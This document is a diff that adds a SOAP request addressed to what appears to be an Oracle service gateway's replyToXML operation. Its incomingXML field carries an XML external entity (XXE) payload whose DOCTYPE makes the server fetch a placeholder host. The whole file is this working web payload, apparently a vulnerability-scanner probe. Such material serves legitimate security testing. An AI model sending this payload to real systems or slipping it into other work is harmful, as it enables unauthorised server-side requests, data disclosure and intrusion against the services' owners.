@@ -1,0 +1,8 @@
+<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://xmlns.oracle.com/oxp/service/service_gateway">
+<soapenv:Header/>
+<soapenv:Body>
+<ser:replyToXML soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+<incomingXML xsi:type="xsd:string"><![CDATA[<?xml version="1.0" encoding="utf-8"?><!DOCTYPE m [ <!ENTITY % xxe SYSTEM "http://site">%xxe;]>]]></incomingXML>
+</ser:replyToXML>
+</soapenv:Body>
+</soapenv:Envelope>
